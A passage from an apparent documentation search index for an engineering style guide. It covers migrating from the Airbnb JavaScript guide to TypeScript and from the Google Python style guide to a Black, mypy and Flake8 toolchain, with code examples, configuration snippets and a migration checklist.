</ul>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#common-migration-pitfalls","title":"Common Migration Pitfalls","text":"","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#1-overuse-of-any-type","title":"1. Overuse of <code>any</code> Type","text":"<p>Problem: Using <code>any</code> everywhere defeats the purpose of TypeScript.</p> <p>Solution: Use specific types or <code>unknown</code> for truly dynamic values.</p> <pre><code>// Avoid\nfunction processData(data: any): any {\n  return data.value;\n}\n\n// Better - use generics or specific types\nfunction processData&lt;T extends { value: string }&gt;(data: T): string {\n  return data.value;\n}\n\n// Or for truly unknown data\nfunction processData(data: unknown): string {\n  if (typeof data === 'object' &amp;&amp; data !== null &amp;&amp; 'value' in data) {\n    return String((data as { value: unknown }).value);\n  }\n  throw new Error('Invalid data structure');\n}\n</code></pre>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#2-ignoring-nullundefined","title":"2. Ignoring Null/Undefined","text":"<p>Problem: Not handling null/undefined cases explicitly.</p> <p>Solution: Enable strict null checks and handle edge cases.</p> <pre><code>// Risky\nfunction getUserEmail(user: User): string {\n  return user.email; // What if user.email is undefined?\n}\n\n// Safe\nfunction getUserEmail(user: User): string | undefined {\n  return user.email;\n}\n\n// Or with default\nfunction getUserEmail(user: User): string {\n  return user.email ?? 'no-email@example.com';\n}\n</code></pre>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#3-type-assertion-abuse","title":"3. Type Assertion Abuse","text":"<p>Problem: Using <code>as</code> type assertions to bypass type checking.</p> <p>Solution: Fix the underlying type issue instead of asserting.</p> <pre><code>// Risky\nconst button = document.getElementById('btn') as HTMLButtonElement;\nbutton.click(); // What if it's not a button?\n\n// Safer\nconst element = document.getElementById('btn');\nif (element instanceof HTMLButtonElement) {\n  element.click();\n}\n</code></pre>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#4-missing-generic-constraints","title":"4. Missing Generic Constraints","text":"<p>Problem: Generics without constraints allow any type.</p> <p>Solution: Add constraints to generics for type safety.</p> <pre><code>// Too permissive\nfunction getProperty&lt;T&gt;(obj: T, key: string) {\n  return obj[key]; // Type error: key not constrained\n}\n\n// Better - constrain the key\nfunction getProperty&lt;T, K extends keyof T&gt;(obj: T, key: K): T[K] {\n  return obj[key];\n}\n</code></pre>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#5-proptypes-not-fully-converted","title":"5. PropTypes Not Fully Converted","text":"<p>Problem: Leaving PropTypes alongside TypeScript types.</p> <p>Solution: Remove PropTypes after adding TypeScript interfaces.</p> <pre><code>// Redundant\ninterface ButtonProps {\n  onClick: () =&gt; void;\n  label: string;\n}\n\nconst Button: React.FC&lt;ButtonProps&gt; = ({ onClick, label }) =&gt; (\n  &lt;button onClick={onClick}&gt;{label}&lt;/button&gt;\n);\n\n// Don't do this - remove PropTypes\nButton.propTypes = {\n  onClick: PropTypes.func.isRequired,\n  label: PropTypes.string.isRequired\n};\n</code></pre>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#gradual-adoption-strategy","title":"Gradual Adoption Strategy","text":"","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#week-1-2-foundation","title":"Week 1-2: Foundation","text":"<ul> <li>Set up TypeScript compiler and configuration</li> <li>Install type definitions for dependencies</li> <li>Configure ESLint for TypeScript</li> <li>Update build pipeline to include type checking</li> </ul>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#week-3-4-core-utilities","title":"Week 3-4: Core Utilities","text":"<ul> <li>Migrate utility functions (<code>.js</code> \u2192 <code>.ts</code>)</li> <li>Add type definitions for common data structures</li> <li>Create shared type definition files</li> <li>No React component migration yet</li> </ul>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#week-5-6-react-components-phase-1","title":"Week 5-6: React Components (Phase 1)","text":"<ul> <li>Start with leaf components (no dependencies)</li> <li>Convert PropTypes to TypeScript interfaces</li> <li>Add prop type definitions</li> <li>Update component signatures</li> </ul>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#week-7-8-react-components-phase-2","title":"Week 7-8: React Components (Phase 2)","text":"<ul> <li>Migrate higher-level components</li> <li>Add context provider types</li> <li>Type custom hooks</li> <li>Add event handler types</li> </ul>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#week-9-10-state-management","title":"Week 9-10: State Management","text":"<ul> <li>Type Redux/Zustand/Context stores</li> <li>Add action and reducer types</li> <li>Type selectors and middleware</li> <li>Ensure type safety in state updates</li> </ul>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#week-11-12-api-async-code","title":"Week 11-12: API &amp; Async Code","text":"<ul> <li>Add types for API responses</li> <li>Type async functions and promises</li> <li>Add types for fetch/axios calls</li> <li>Create API client interfaces</li> </ul>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#month-4-polish-and-strictness","title":"Month 4+: Polish and Strictness","text":"<ul> <li>Enable all strict TypeScript flags</li> <li>Remove all <code>// @ts-ignore</code> comments</li> <li>Achieve 95%+ type coverage</li> <li>Zero TypeScript errors project-wide</li> </ul>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#success-metrics","title":"Success Metrics","text":"Metric Target Measurement Type Coverage 95%+ <code>npx type-coverage</code> TypeScript Errors 0 <code>tsc --noEmit</code> <code>any</code> Usage &lt;1% ESLint rule Strict Mode Enabled <code>tsconfig.json</code> PropTypes Removed 100% No <code>prop-types</code> in deps Test Coverage 80%+ Jest with types","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#side-by-side-comparison-airbnb-vs-dukes-engineering","title":"Side-by-Side Comparison: Airbnb vs. Dukes Engineering","text":"Aspect Airbnb JavaScript Dukes Engineering TypeScript Language JavaScript (ES6+) TypeScript Type System None (JSDoc comments) Static types required Type Checking Runtime (PropTypes) Compile-time React Prop Validation PropTypes TypeScript interfaces Null Safety Runtime checks Compile-time strictNullChecks IDE Support Good Excellent (autocomplete, refactoring) Error Detection Runtime Compile-time Generics Not available Used extensively Interfaces Not available Required for data structures Enum Support Object constants Native enums Build Step Babel TypeScript compiler File Extensions <code>.js</code>, <code>.jsx</code> <code>.ts</code>, <code>.tsx</code> Linter ESLint (JavaScript) ESLint + TypeScript plugin","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#support-and-resources","title":"Support and Resources","text":"","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#documentation-references","title":"Documentation References","text":"<ul> <li>TypeScript Style Guide - Full Dukes Engineering TypeScript standards</li> <li>Testing Strategies - TypeScript testing patterns</li> <li>IDE Integration Guide - VS Code TypeScript setup</li> <li>GitHub Actions Guide - TypeScript CI/CD workflows</li> </ul>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#tool-documentation","title":"Tool Documentation","text":"<ul> <li>TypeScript Handbook - Official TypeScript docs</li> <li>TypeScript ESLint - ESLint for TypeScript</li> <li>React TypeScript Cheatsheet - React with TypeScript</li> <li>@types packages - Type definitions</li> </ul>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#external-references","title":"External References","text":"<ul> <li>Airbnb JavaScript Style Guide - Original Airbnb guide</li> <li>Airbnb React Style Guide - React conventions</li> <li>TypeScript Migration Guide - Official migration docs</li> </ul>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#conclusion","title":"Conclusion","text":"<p>Migrating from Airbnb JavaScript Style Guide to Dukes Engineering TypeScript Style Guide brings:</p> <p>\u2705 Type Safety - Catch errors at compile-time instead of runtime \u2705 Better IDE Support - Enhanced autocomplete, refactoring, and navigation \u2705 Self-Documenting Code - Types serve as inline documentation \u2705 Refactoring Confidence - Type system ensures changes don't break contracts \u2705 DevOps Ready - Type safety essential for infrastructure automation \u2705 Modern Tooling - Latest TypeScript features and ecosystem \u2705 Scalability - Type system scales with codebase growth</p> <p>While Airbnb's JavaScript guide is excellent, TypeScript adds critical type safety and developer experience improvements essential for modern DevOps workflows, infrastructure automation, and large-scale applications.</p> <p>Questions or need help? Open an issue or consult the Getting Started Guide.</p>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/","title":"Migrating from Google Python Style Guide to Dukes Engineering Style Guide","text":"","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#overview","title":"Overview","text":"<p>This guide helps Python developers transition from the Google Python Style Guide to the Dukes Engineering Style Guide. While both guides share many similarities and are both based on PEP 8, the Dukes Engineering guide adds DevOps-focused enhancements and modern tooling requirements for infrastructure automation.</p>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#what-this-guide-covers","title":"What This Guide Covers","text":"<ul> <li>Compatibility assessment between Google and Dukes Engineering guides</li> <li>Key differences in formatting and conventions</li> <li>Enhanced requirements for DevOps workflows</li> <li>Tool migration (Pylint \u2192 Black + mypy + pytest)</li> <li>Step-by-step migration checklist</li> <li>Before/after code examples</li> </ul>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#who-should-use-this-guide","title":"Who Should Use This Guide","text":"<ul> <li>Google-style Python projects transitioning to Dukes Engineering standards</li> <li>Teams familiar with Google's conventions adopting DevOps best practices</li> <li>Projects adding infrastructure automation requirements</li> <li>Organizations standardizing on Black, mypy, and modern Python tooling</li> </ul>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#quick-compatibility-summary","title":"Quick Compatibility Summary","text":"<pre><code>graph LR\n    Google[Google Python&lt;br/&gt;Style Guide] --&gt; Compatible[High Compatibility&lt;br/&gt;Shared PEP 8 Base]\n    Google --&gt; Differences[Key Differences&lt;br/&gt;Indentation, Line Length, Tools]\n    Google --&gt; Enhanced[Enhanced for DevOps&lt;br/&gt;Type Hints, Metadata, Testing]\n\n    Compatible --&gt; Migration[Migration Path]\n    Differences --&gt; Migration\n    Enhanced --&gt; Migration\n\n    Migration --&gt; Dukes[Dukes Engineering&lt;br/&gt;Style Guide]\n\n    style Compatible fill:#e8f5e9\n    style Differences fill:#fff3e0\n    style Enhanced fill:#f3e5f5\n    style Dukes fill:#e3f2fd</code></pre>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#what-stays-the-same","title":"What Stays the Same","text":"<p>Both Google and Dukes Engineering guides share these core PEP 8 conventions:</p>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#naming-conventions","title":"Naming Conventions \u2705","text":"Element Convention Google Our Guide Modules <code>snake_case</code> \u2705 \u2705 Same Packages <code>snake_case</code> \u2705 \u2705 Same Classes <code>PascalCase</code> \u2705 \u2705 Same Exceptions <code>Error</code> suffix \u2705 \u2705 Same Functions <code>snake_case</code> \u2705 \u2705 Same Global/Class Constants <code>UPPER_SNAKE_CASE</code> \u2705 \u2705 Same Global/Class Variables <code>snake_case</code> \u2705 \u2705 Same Instance Variables <code>snake_case</code> \u2705 \u2705 Same Private <code>_leading_underscore</code> \u2705 \u2705 Same","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#import-organization","title":"Import Organization \u2705","text":"<p>Both guides require:</p> <ul> <li>Standard library imports first</li> <li>Third-party library imports second</li> <li>Local application imports last</li> <li>Alphabetical ordering within each group</li> <li>Absolute imports preferred over relative</li> </ul>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#string-quotes","title":"String Quotes \u2705","text":"<p>Both allow single and double quotes (prefer consistency within a file)</p>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#docstring-format","title":"Docstring Format \u2705","text":"<p>Both use Google-style docstrings with <code>Args:</code>, <code>Returns:</code>, <code>Raises:</code> sections</p>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#what-changes-key-differences","title":"What Changes: Key Differences","text":"","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#1-indentation-2-spaces-4-spaces","title":"1. Indentation: 2 Spaces \u2192 4 Spaces","text":"<p>Google: 2 spaces per indentation level Our Guide: 4 spaces per indentation level (PEP 8 standard)</p> <p>Why: PEP 8 specifies 4 spaces as the standard. Most Python tooling and IDEs default to 4 spaces. Consistency with the broader Python ecosystem improves code readability across projects.</p> <p>Migration:</p> <pre><code>## Google - 2 spaces\ndef calculate_total(items):\n  total = 0\n  for item in items:\n    if item.is_valid:\n      total += item.price\n  return total\n\n## Our Guide - 4 spaces\ndef calculate_total(items):\n    total = 0\n    for item in items:\n        if item.is_valid:\n            total += item.price\n    return total\n</code></pre> <p>Action Required:</p> <ul> <li>Configure editor to use 4 spaces for indentation</li> <li>Run Black formatter to automatically convert indentation</li> <li>Update <code>.editorconfig</code> if present:</li> </ul> <pre><code>[*.py]\nindent_style = space\nindent_size = 4\n</code></pre>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#2-line-length-80-characters-88-characters","title":"2. Line Length: 80 Characters \u2192 88 Characters","text":"<p>Google: Maximum 80 characters (strict) Our Guide: Maximum 88 characters (Black default)</p> <p>Why: Black's 88-character limit provides a better balance between line length and code density, reducing unnecessary line breaks while maintaining readability on modern displays.</p> <p>Migration:</p> <pre><code>## Google - 80 chars, requires breaking\nresult = database.query(User).filter(\n    User.is_active == True\n).order_by(User.created_at).all()\n\n## Our Guide - 88 chars, more natural\nresult = database.query(User).filter(User.is_active == True).order_by(\n    User.created_at\n).all()\n</code></pre> <p>Action Required:</p> <ul> <li>Update editor rulers from 80 to 88 characters</li> <li>Configure Black with default 88 character line length</li> <li>Update Pylint/Flake8 to allow 88 characters</li> </ul>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#3-type-hints-recommended-required","title":"3. Type Hints: Recommended \u2192 Required","text":"<p>Google: Type annotations encouraged but optional Our Guide: Type hints required for all function signatures</p> <p>Why: Infrastructure automation and DevOps code benefits significantly from type safety. Type hints enable static analysis, prevent runtime errors, and serve as inline documentation.</p> <p>Migration:</p> <pre><code>## Google - optional type hints\ndef get_user(user_id):\n    \"\"\"Retrieve user by ID.\n\n    Args:\n        user_id: The user ID to retrieve.\n\n    Returns:\n        User object if found, None otherwise.\n    \"\"\"\n    return database.query(User).filter(User.id == user_id).first()\n\n## Our Guide - required type hints\nfrom typing import Optional\n\ndef get_user(user_id: int) -&gt; Optional[User]:\n    \"\"\"\n    Retrieve user by ID.\n\n    Args:\n        user_id: The user ID to retrieve\n\n    Returns:\n        User object if found, None otherwise\n    \"\"\"\n    return database.query(User).filter(User.id == user_id).first()\n</code></pre> <p>Action Required:</p> <ul> <li>Add type hints to all function signatures</li> <li>Import from <code>typing</code> module: <code>List</code>, <code>Dict</code>, <code>Optional</code>, <code>Union</code>, <code>Tuple</code></li> <li>Run <code>mypy</code> for type validation</li> <li>Remove redundant type information from docstrings (types now in hints)</li> </ul>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#4-documentation-google-docstrings-enhanced-metadata","title":"4. Documentation: Google Docstrings \u2192 Enhanced Metadata","text":"<p>Google: Standard Google-style docstrings Our Guide: Google-style docstrings + structured module metadata</p> <p>Why: Enhanced metadata enables automated documentation generation, dependency tracking, version management, and AI-assisted code analysis for DevOps workflows.</p> <p>Migration:</p> <pre><code>## Google - basic module docstring\n\"\"\"User authentication and session management.\"\"\"\n\nimport jwt\nfrom fastapi import HTTPException\n\n## Our Guide - enhanced module metadata\n\"\"\"\n@module user_authentication\n@description Handles user authentication, session management, and JWT token generation\n@dependencies fastapi, pyjwt, passlib, python-dotenv\n@version 1.2.0\n@author Tyler Dukes\n@last_updated 2025-12-07\n@status stable\n@security_classification internal\n@python_version &gt;= 3.9\n\"\"\"\n\nimport jwt\nfrom fastapi import HTTPException\n</code></pre> <p>Action Required:</p> <ul> <li>Add structured metadata to all module docstrings</li> <li>Document all dependencies explicitly</li> <li>Add version, author, and status information</li> <li>Specify security classification for sensitive modules</li> <li>Document minimum Python version requirements</li> </ul>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#5-formatters-pylint-yapf-black-mypy-flake8","title":"5. Formatters: Pylint + YAPF \u2192 Black + mypy + Flake8","text":"<p>Google: Pylint for linting, YAPF for formatting Our Guide: Black (formatting) + mypy (type checking) + Flake8 (linting)</p> <p>Why: Black is opinionated and eliminates formatting debates. mypy provides comprehensive type checking. Flake8 catches style and logical errors.</p> <p>Google Tool Stack:</p> <pre><code>## Google typical setup\npip install pylint yapf\npylint --rcfile=.pylintrc src/\nyapf -i -r src/\n</code></pre> <p>Our Tool Stack:</p> <pre><code>## Dukes Engineering setup\npip install black mypy flake8 isort\nblack .\nisort .\nmypy src/\nflake8 .\n</code></pre> <p>Action Required:</p> <ul> <li>Remove YAPF and Pylint configurations</li> <li>Install Black, mypy, Flake8, isort</li> <li>Configure tools in <code>pyproject.toml</code></li> <li>Set up pre-commit hooks</li> <li>Update CI/CD pipelines</li> </ul>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#6-testing-flexible-required-80-coverage","title":"6. Testing: Flexible \u2192 Required 80%+ Coverage","text":"<p>Google: Testing encouraged, no specific coverage requirement Our Guide: 80%+ test coverage required, specific naming conventions</p> <p>Why: DevOps and infrastructure code requires high reliability. Automated testing with strong coverage prevents production incidents.</p> <p>Migration:</p> <pre><code>## Google - flexible test naming and structure\ndef test_user_creation():\n    user = create_user(\"john@example.com\")\n    assert user.email == \"john@example.com\"\n\n## Our Guide - structured naming and Arrange-Act-Assert\ndef test_should_create_user_when_valid_email_provided():\n    \"\"\"Test create_user creates user with valid email.\"\"\"\n    # Arrange\n    email = \"john@example.com\"\n\n    # Act\n    user = create_user(email)\n\n    # Assert\n    assert user.email == email\n    assert user.id is not None\n</code></pre> <p>Action Required:</p> <ul> <li>Adopt test naming: <code>test_should_&lt;behavior&gt;_when_&lt;condition&gt;</code></li> <li>Structure tests with Arrange-Act-Assert pattern</li> <li>Set up pytest with coverage reporting (target 80%+)</li> <li>Configure coverage enforcement in CI/CD</li> <li>Add coverage badges to README</li> </ul>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#7-security-best-practices-explicit-requirements","title":"7. Security: Best Practices \u2192 Explicit Requirements","text":"<p>Google: Security best practices mentioned generally Our Guide: Explicit security requirements with tooling</p> <p>Why: Infrastructure automation handles sensitive credentials, cloud resources, and production systems. Security must be enforced, not just recommended.</p> <p>Migration - Input Validation:</p> <pre><code>## Google - manual validation\ndef get_user_by_email(email):\n    if not email or '@' not in email:\n        raise ValueError(\"Invalid email\")\n    return database.query(email)\n\n## Our Guide - schema validation with Pydantic\nfrom pydantic import BaseModel, EmailStr\n\nclass UserQuery(BaseModel):\n    \"\"\"Validated user query request.\"\"\"\n    email: EmailStr\n\ndef get_user_by_email(email: str) -&gt; Optional[User]:\n    \"\"\"Get user by email with validated input.\"\"\"\n    query_data = UserQuery(email=email)\n    return database.query(query_data.email)\n</code></pre> <p>Migration - Secret Management:</p> <pre><code>## Google - configuration flexibility\nAPI_KEY = \"sk_live_abc123\"  # Not ideal but allowed\n\n## Our Guide - environment variables required\nimport os\n\nAPI_KEY = os.getenv(\"API_KEY\")\nif not API_KEY:\n    raise EnvironmentError(\"API_KEY environment variable required\")\n</code></pre> <p>Action Required:</p> <ul> <li>Add input validation with Pydantic or similar</li> <li>Move all secrets to environment variables</li> <li>Add <code>.env</code> to <code>.gitignore</code></li> <li>Run Bandit security scanner in CI/CD</li> <li>Use parameterized queries (never string concatenation for SQL)</li> </ul>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#8-error-handling-flexible-fail-fast-with-specific-exceptions","title":"8. Error Handling: Flexible \u2192 Fail-Fast with Specific Exceptions","text":"<p>Google: Standard exception handling Our Guide: Fail-fast with custom exception hierarchies</p> <p>Why: Infrastructure code should fail explicitly and early with clear error messages. Custom exceptions improve error handling and debugging.</p> <p>Migration:</p> <pre><code>## Google - standard exceptions\ndef fetch_data(url):\n    try:\n        response = requests.get(url)\n        return response.json()\n    except Exception as e:\n        print(f\"Error: {e}\")\n        return None\n\n## Our Guide - custom exceptions and proper logging\nclass APIError(Exception):\n    \"\"\"Base exception for API-related errors.\"\"\"\n    pass\n\nclass APITimeoutError(APIError):\n    \"\"\"Raised when API request times out.\"\"\"\n    pass\n\ndef fetch_data(url: str) -&gt; Dict:\n    \"\"\"Fetch data from remote API with proper error handling.\"\"\"\n    try:\n        response = requests.get(url, timeout=10)\n        response.raise_for_status()\n        return response.json()\n    except requests.Timeout:\n        logger.error(f\"Timeout fetching data from {url}\")\n        raise APITimeoutError(f\"Request to {url} timed out\")\n    except requests.HTTPError as e:\n        logger.error(f\"HTTP error {e.response.status_code}: {url}\")\n        raise APIError(f\"Failed to fetch data: {e}\")\n</code></pre> <p>Action Required:</p> <ul> <li>Create custom exception hierarchies for your domain</li> <li>Replace generic <code>except Exception</code> with specific exceptions</li> <li>Add structured logging before raising exceptions</li> <li>Never silently catch exceptions</li> <li>Use context managers for resource cleanup</li> </ul>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#tool-configuration-migration","title":"Tool Configuration Migration","text":"","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#from-pylint-to-black-flake8-mypy","title":"From Pylint to Black + Flake8 + mypy","text":"","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#remove-pylint-configuration","title":"Remove Pylint Configuration","text":"<p>Delete or comment out in <code>setup.cfg</code> or <code>.pylintrc</code>:</p> <pre><code>## [pylint]\n## max-line-length = 80\n## disable = ...\n</code></pre>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#add-black-configuration","title":"Add Black Configuration","text":"<p>In <code>pyproject.toml</code>:</p> <pre><code>[tool.black]\nline-length = 88\ntarget-version = ['py39', 'py310', 'py311']\ninclude = '\\.pyi?$'\n</code></pre>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#add-mypy-configuration","title":"Add mypy Configuration","text":"<p>In <code>pyproject.toml</code>:</p> <pre><code>[tool.mypy]\npython_version = \"3.9\"\nwarn_return_any = true\nwarn_unused_configs = true\ndisallow_untyped_defs = true\ndisallow_any_unimported = true\nno_implicit_optional = true\nwarn_redundant_casts = true\nwarn_unused_ignores = true\nwarn_no_return = true\ncheck_untyped_defs = true\nstrict_equality = true\n</code></pre>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#add-flake8-configuration","title":"Add Flake8 Configuration","text":"<p>In <code>.flake8</code> or <code>setup.cfg</code>:</p> <pre><code>[flake8]\nmax-line-length = 88\nextend-ignore = E203, E266, E501, W503\nexclude = .git,__pycache__,.venv,venv,migrations\nmax-complexity = 10\n</code></pre>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#add-isort-configuration","title":"Add isort Configuration","text":"<p>In <code>pyproject.toml</code>:</p> <pre><code>[tool.isort]\nprofile = \"black\"\nline_length = 88\nmulti_line_output = 3\ninclude_trailing_comma = true\nforce_grid_wrap = 0\nuse_parentheses = true\nensure_newline_before_comments = true\n</code></pre>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#from-yapf-to-black","title":"From YAPF to Black","text":"<p>YAPF and Black both format code, but Black is non-configurable (opinionated).</p> <p>Remove YAPF:</p> <pre><code>## Uninstall YAPF\npip uninstall yapf\n\n## Remove .style.yapf or [yapf] sections in setup.cfg\nrm .style.yapf\n</code></pre> <p>Install and Configure Black:</p> <pre><code>## Install Black\npip install black\n\n## Format entire codebase\nblack .\n\n## Check formatting without changes\nblack --check .\n</code></pre>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#pre-commit-hooks-setup","title":"Pre-commit Hooks Setup","text":"<p>Replace Google's pre-commit configuration with Dukes Engineering stack:</p> <pre><code>## .pre-commit-config.yaml\nrepos:\n  - repo: https://github.com/psf/black\n    rev: 24.10.0\n    hooks:\n      - id: black\n        language_version: python3.11\n\n  - repo: https://github.com/pycqa/isort\n    rev: 5.13.2\n    hooks:\n      - id: isort\n        args: [\"--profile\", \"black\"]\n\n  - repo: https://github.com/pycqa/flake8\n    rev: 7.1.1\n    hooks:\n      - id: flake8\n        args: [\"--max-line-length=88\", \"--extend-ignore=E203\"]\n\n  - repo: https://github.com/pre-commit/mirrors-mypy\n    rev: v1.11.2\n    hooks:\n      - id: mypy\n        additional_dependencies: [types-requests]\n\n  - repo: https://github.com/PyCQA/bandit\n    rev: 1.7.9\n    hooks:\n      - id: bandit\n        args: [\"-c\", \"pyproject.toml\"]\n\n  - repo: https://github.com/pre-commit/pre-commit-hooks\n    rev: v4.6.0\n    hooks:\n      - id: trailing-whitespace\n      - id: end-of-file-fixer\n      - id: check-yaml\n      - id: check-added-large-files\n      - id: detect-private-key\n</code></pre> <p>Install and Activate:</p> <pre><code>pip install pre-commit\npre-commit install\npre-commit run --all-files\n</code></pre>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#migration-checklist","title":"Migration Checklist","text":"","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#phase-1-tool-setup-and-configuration","title":"Phase 1: Tool Setup and Configuration","text":"<ul> <li>[ ] Install new tooling</li> </ul> <pre><code>pip install black isort mypy flake8 pytest pytest-cov pre-commit bandit\n</code></pre> <ul> <li>[ ] Remove old tooling</li> </ul> <pre><code>pip uninstall yapf pylint\nrm .pylintrc .style.yapf\n</code></pre> <ul> <li>[ ] Create <code>pyproject.toml</code> configuration</li> <li>Add Black configuration (88 char line length)</li> <li>Add isort configuration (Black-compatible profile)</li> <li>Add mypy strict configuration</li> <li> <p>Add pytest configuration (80% coverage minimum)</p> </li> <li> <p>[ ] Create <code>.flake8</code> configuration</p> </li> <li>Set max-line-length to 88</li> <li> <p>Configure ignore rules for Black compatibility</p> </li> <li> <p>[ ] Create <code>.pre-commit-config.yaml</code></p> </li> <li>Add Black, isort, Flake8, mypy hooks</li> <li>Add Bandit security scanner</li> <li> <p>Run <code>pre-commit install</code></p> </li> <li> <p>[ ] Update <code>.editorconfig</code></p> </li> </ul> <pre><code>[*.py]\nindent_style = space\nindent_size = 4\nmax_line_length = 88\n</code></pre>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#phase-2-code-reformatting","title":"Phase 2: Code Reformatting","text":"<ul> <li>[ ] Convert indentation from 2 to 4 spaces</li> </ul> <pre><code># Black will handle this automatically\nblack .\n</code></pre> <ul> <li>[ ] Organize imports</li> </ul> <pre><code>isort .\n</code></pre> <ul> <li>[ ] Verify formatting</li> </ul> <pre><code>black --check .\nisort --check .\nflake8 .\n</code></pre> <ul> <li>[ ] Commit formatted code</li> <li>Separate commit for formatting changes</li> <li>Makes review easier</li> </ul>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#phase-3-add-type-hints","title":"Phase 3: Add Type Hints","text":"<ul> <li>[ ] Audit existing type annotations</li> <li>Identify functions missing type hints</li> <li> <p>Use <code>mypy --disallow-untyped-defs</code> to find gaps</p> </li> <li> <p>[ ] Add type hints incrementally</p> </li> <li>Start with public APIs and exported functions</li> <li>Work through modules systematically</li> <li> <p>Use <code>from typing import</code> for complex types</p> </li> <li> <p>[ ] Run mypy validation</p> </li> </ul> <pre><code>mypy src/\n</code></pre> <ul> <li>[ ] Fix type errors</li> <li>Address all mypy errors and warnings</li> <li> <p>Use <code># type: ignore</code> sparingly for edge cases</p> </li> <li> <p>[ ] Remove redundant type info from docstrings</p> </li> <li>Types are now in annotations</li> <li>Docstrings focus on descriptions</li> 